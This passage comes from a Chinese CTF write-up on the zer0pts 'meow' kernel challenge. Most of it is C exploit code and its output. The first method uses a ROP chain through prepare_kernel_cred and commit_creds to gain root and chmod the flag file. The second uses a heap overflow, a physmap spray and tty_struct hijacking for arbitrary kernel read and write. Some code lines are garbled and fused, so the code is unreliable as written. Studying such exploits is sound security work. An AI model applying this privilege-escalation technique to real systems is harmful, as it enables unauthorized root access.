        buf.vec[0x28/8] = xchg_eax_esp;
        size_t base = xchg_eax_esp & 0xfffff000;
        if(base != mmap(base,0x3000,7,MAP_PRIVATE | MAP_ANONYMOUS,-1,0)){
            fail("mmap failed!n");
            exit(-1);
        }
        msg("base address:0x%llxn",base);
        size_t pop_rdi = base_add(raw_pop_rdi);
        size_t pop_rdx = base_add(raw_pop_rdx);
        size_t mov_rdi_rax = base_add(raw_mov_rdi_rax);
        size_t pop_rsi = base_add(raw_pop_rsi);
        i=0;
        rop[i++] = pop_rdi;
        rop[i++] = 0;
        rop[i++] = prepare_kernel_cred_addr;
        rop[i++] = pop_rdx;
        rop[i++] = 0x100000001;
        rop[i++] = mov_rdi_rax;
        rop[i++] = commit_creds_addr;
        rop[i++] = pop_rdi;
        rop[i++] = 0xffffff9c;
        rop[i++] = pop_rsi;
        rop[i++] = flag_str;
        rop[i++] = pop_rdx;
        rop[i++] = 0777;
        rop[i++] = base_add(raw_x64_sys_chmod)+0xd;
        rop[i++] = pop_rdi;
        rop[i++] = 0x1000000;
        rop[i++] = base_add(raw_msleep);
        memcpy(xchg_eax_esp & 0xffffffff,rop,sizeof(rop));
        mod_write(fd,&buf,sizeof(buf));    
        ioctl(tty_fd,0,0);
        return 0;
    }
运行效果如下：
    ivan@ubuntu:~/kernel/meow$ sudo ./start.sh 
    / $ id
    uid=1000 gid=1000 groups=1000
    / $ ls -al | grep flag
    -r--------    1 root     root            28 Mar  8 09:26 flag
    / $ ./exp &
    / $ [*] leak heap addr: 0xffff8aca0db56c00
    [*] do_tty_hangup addr: 0xffffffffafe0f6b0
    [*] vmlinux_base addr: 0xffffffffafa00000
    [*] base address:0xafa12000
    ls -al | grep flag
    -rwxrwxrwx    1 root     root            28 Mar  8 09:26 flag
    / $ cat flag
    zer0pts{*****CENSORED*****}
## 方法二
###  利用思路
另一种方法是总结参考[1]中作者思路，他找到两个gadget：
    write_gadget: mov dword ptr [rdx], esi; ret; 
    read_gadget: mov rax, qword ptr [rdx + 0x28]; ret;
可以将这两个 gadget 与劫持 `ioctl` 指针结合达到任意地址读写的目的。
具体步骤如下：
  * 利用堆溢出漏洞修改 SLAB 堆指针，使得下次分配堆块到一个较低的地址；
  * ret2dir，使用physmap spray 使得用户空间地址与内核空间地址映射出现重叠（即两块或者多块虚拟内存映射到同一块物理内存），之后打开 ptmx 设备使得该设备的 `tty_struct` 结构体落入重叠区域；遍历 physmap 找到该设备所在页，此时该页面大概率与用户空间地址重合；
  * 之后修改 `ops` 指针到 `memo` 所在内存，并在其中构造 `tty_operations` 结构体；
  * 请求 ptmx 创建一个pts；遍历 `init_task` 找到当前进程，通过任意地址读写修改当前进程 `cred` 结构改写uid值为0；
  * 读取 flag 文件。
个人认为physmap spray 这个步骤可以省略，直接通过方法一的方式堆溢出修改 `tty_struct` 结构体即可。不过ret2dir
可以不用修改cr4寄存器达到绕过 SMEP/SMAP的目的。
###  exp
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define LOG(f_, ...) printf(("[*] " f_), __VA_ARGS__)
    #define SPRAY_CNT 32*32*32 // 4K*32*32*32=128M
    #define PAGESIZE 0x1000 //4k
    #define TASKS_OFFSET 0x388
    #define CRED_OFFSET 0x620
    #define PID_OFFSET 0x488
    void *sprayed_pages[SPRAY_CNT];
    char zeropage[PAGESIZE];
    int fd;
    int slave_fd;
    unsigned long kernel_base;
    unsigned long r_gadget;
    unsigned long w_gadget;
    unsigned long init_task;
    unsigned long setup_disble_smap;
    unsigned long ftable[0x80];
    struct skewBuf {
        unsigned char blank;
        unsigned long vec[127];
        unsigned char leftover[7];
    }  __attribute__((packed));
    int Open(const char *fname, int mode) {
        int fd = open(fname, mode);
        if (fd > 12) * sizeof(pginfo), SEEK_SET) > 32;
        write32((unsigned int )part, where + 4);
    }
    unsigned long read64(unsigned long where) {
        unsigned long p1, p2;
        p1 = read32(where);
        p2 = read32(where + 4);
        return p1 | (p2 > 63))) {
                return 0;
            }
        }
        return page[0x100] == 0;
    }
    int main(int argc, char **argv) {
        char trash[0x3FF];
        struct skewBuf buf;
        int i;
        assert(sizeof(buf) == 0x400);
        memset(trash, 0xcc, sizeof(trash));
        // open the device
        fd = Open("/dev/memo", O_RDWR);
        // leak a SLAB address
        Write(fd, trash, sizeof(trash));
        Read(fd, &buf, sizeof(buf));
        unsigned long heapAddr = buf.vec[0];
        LOG("Got a kernel heap leak: %pn", (void *)heapAddr);
        // overwrite the fd of next chunk to a 'guess'ed physmap address
        lseek(fd, 0x3FF, SEEK_SET);
        buf.vec[0] = heapAddr & 0xffffffffff000000;
        LOG("tty_struct will be allocated at address: %pn", (void *)buf.vec[0]);
        Write(fd, &buf, sizeof(buf));
        // physmap spray
        physmap_spray();
        // allocate a ptmx object, it will be allocated to userspace mmap pages
        int tty_fd = Open("/dev/ptmx", O_RDWR|O_NOCTTY);
        unsigned long*pg = page_hit();
        if (!pg) {
            puts("[-] failed to get a tty_struct allocated in one of our pages");
            exit(-1);
        }
        LOG("now page %p is synonymous with tty_struct of fd %dn", pg, tty_fd);
        // create fake fops
        // 0xffffffff810a0333: mov dword ptr [rdx], esi; ret; 
        // 0xffffffff81051543: mov rax, qword ptr [rdx + 0x28]; ret; 
        unsigned long fops = pg[3];
        kernel_base = fops - 0xffffffff81e65800 + 0xffffffff80e00000;
        w_gadget = kernel_base + 0xffffffff810a0333 - 0xffffffff80e00000;
        r_gadget = kernel_base + 0xffffffff81051543 - 0xffffffff80e00000;
        init_task = kernel_base + 0xFFFFFFFF82211740 - 0xffffffff80e00000;
        setup_disble_smap = kernel_base + 0xffffffff8a98f556 - 0xffffffff80e00000;
        for (i = 0; i   
[2]   
[3]   
[4]   
[5]   
[6] 